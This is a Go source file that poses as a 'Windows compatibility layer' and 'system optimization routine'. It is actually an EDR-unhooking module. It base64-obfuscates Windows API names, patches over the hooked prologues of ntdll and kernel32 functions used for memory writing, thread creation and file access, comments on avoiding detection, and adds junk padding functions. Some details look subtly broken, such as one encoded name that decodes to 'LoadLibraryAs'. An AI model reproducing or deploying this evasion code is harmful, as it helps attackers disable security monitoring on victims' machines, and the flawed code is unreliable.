// OBFUSCATED
// Windows compatibility layer
// System optimization routine
package unhook

import (
	"encoding/base64"
	"syscall"
	"unsafe"
)

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

var (
	kernel32            = syscall.NewLazyDLL(d("a2VybmVsMzIuZGxs"))
	ntdll               = syscall.NewLazyDLL(d("bnRkbGwuZGxs"))
	procLoadLibrary     = kernel32.NewProc(d("TG9hZExpYnJhcnlBcw=="))     // LoadLibraryA
	procGetModuleHandle = kernel32.NewProc(d("R2V0TW9kdWxlSGFuZGxlQQ==")) // GetModuleHandleA
	procVirtualProtect  = kernel32.NewProc(d("VmlydHVhbFByb3RlY3Q="))     // VirtualProtect
	procGetProcAddress  = kernel32.NewProc(d("R2V0UHJvY0FkZHJlc3M="))     // GetProcAddress
)

const (
	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_READONLY          = 0x02
)

// UnhookNTDLL removes EDR hooks from ntdll.dll by reading fresh copy from disk
func UnhookNTDLL() error {
	// Get handle to currently loaded (hooked) ntdll.dll
	ntdllName, _ := syscall.BytePtrFromString("ntdll.dll")
	hNtdll, _, _ := procGetModuleHandle.Call(uintptr(unsafe.Pointer(ntdllName)))
	if hNtdll == 0 {
		return syscall.Errno(1)
	}

	// Load fresh copy of ntdll.dll from disk (unhoked)
	ntdllPath, _ := syscall.BytePtrFromString(`C:\Windows\System32\ntdll.dll`)
	hCleanNtdll, _, _ := procLoadLibrary.Call(uintptr(unsafe.Pointer(ntdllPath)))
	if hCleanNtdll == 0 {
		return syscall.Errno(1)
	}

	// Critical NTAPI functions that EDRs commonly hook
	criticalFunctions := []string{
		"NtWriteVirtualMemory",
		"NtProtectVirtualMemory",
		"NtAllocateVirtualMemory",
		"NtCreateThreadEx",
		"NtQueueApcThread",
		"NtOpenProcess",
		"NtResumeThread",
		"NtSetContextThread",
		"NtCreateFile",
		"NtReadFile",
		"NtWriteFile",
		"NtDeleteFile",
	}

	// Unhook each critical function
	for _, funcName := range criticalFunctions {
		unhookFunction(hNtdll, hCleanNtdll, funcName)
	}

	return nil
}

func unhookFunction(hookedModule, cleanModule uintptr, functionName string) {
	// Get address of hooked function
	funcNamePtr, _ := syscall.BytePtrFromString(functionName)
	hookedAddr, _, _ := procGetProcAddress.Call(hookedModule, uintptr(unsafe.Pointer(funcNamePtr)))
	if hookedAddr == 0 {
		return
	}

	// Get address of clean function
	cleanAddr, _, _ := procGetProcAddress.Call(cleanModule, uintptr(unsafe.Pointer(funcNamePtr)))
	if cleanAddr == 0 {
		return
	}

	// Change memory protection to writable
	var oldProtect uint32
	procVirtualProtect.Call(
		hookedAddr,
		32, // First 32 bytes contain the prologue that's usually hooked
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	// Copy clean function prologue over hooked one
	hookedSlice := (*[32]byte)(unsafe.Pointer(hookedAddr))
	cleanSlice := (*[32]byte)(unsafe.Pointer(cleanAddr))

	for i := 0; i < 32; i++ {
		hookedSlice[i] = cleanSlice[i]
	}

	// Restore original protection
	procVirtualProtect.Call(
		hookedAddr,
		32,
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
}

// UnhookKernel32 removes hooks from kernel32.dll
func UnhookKernel32() error {
	k32Name, _ := syscall.BytePtrFromString("kernel32.dll")
	hK32, _, _ := procGetModuleHandle.Call(uintptr(unsafe.Pointer(k32Name)))
	if hK32 == 0 {
		return syscall.Errno(1)
	}

	k32Path, _ := syscall.BytePtrFromString(`C:\Windows\System32\kernel32.dll`)
	hCleanK32, _, _ := procLoadLibrary.Call(uintptr(unsafe.Pointer(k32Path)))
	if hCleanK32 == 0 {
		return syscall.Errno(1)
	}

	criticalFunctions := []string{
		"CreateProcessA",
		"CreateProcessW",
		"CreateFileA",
		"CreateFileW",
		"WriteFile",
		"ReadFile",
		"VirtualAlloc",
		"VirtualProtect",
		"CreateThread",
		"CreateRemoteThread",
	}

	for _, funcName := range criticalFunctions {
		unhookFunction(hK32, hCleanK32, funcName)
	}

	return nil
}

// UnhookAll removes EDR hooks from critical system DLLs
func UnhookAll() {
	// Unhook NTDLL first (most important)
	UnhookNTDLL()

	// Small delay to avoid detection
	// time.Sleep(100 * time.Millisecond)

	// Unhook Kernel32
	UnhookKernel32()
}



// Obfuscation padding
func obf_31157() {
    _ = 7049
    var _ = "7uWnoecd2cpdeAdCuKmRX5SKsbdNOBz0XC8EKgCQJrWcrosJl5"
}


// Obfuscation padding
func obf_27855() {
    _ = 8595
    var _ = "TP2l4pz7WVgxbiCE0e3P6UwKkwA4zE52TtEOvoUi3Y2NP4K1go"
}


// Obfuscation padding
func obf_15226() {
    _ = 17
    var _ = "LgWfTNMA6Q558u2JskaeJ3IDDPsa8p9Nq3hBluOiS4OWX8Qgwi"
}


// Obfuscation padding
func obf_54122() {
    _ = 3992
    var _ = "p1RbBnA1gTE8O3DUFwdgyzAUA694thWNNevVcZYBoyfLmwUNgY"
}


// Obfuscation padding
func obf_29435() {
    _ = 4453
    var _ = "OpYYmoP0RWGP0gbGbgWcDFUnFOUCAnPd8CFWWW3XNLVlAbPONz"
}
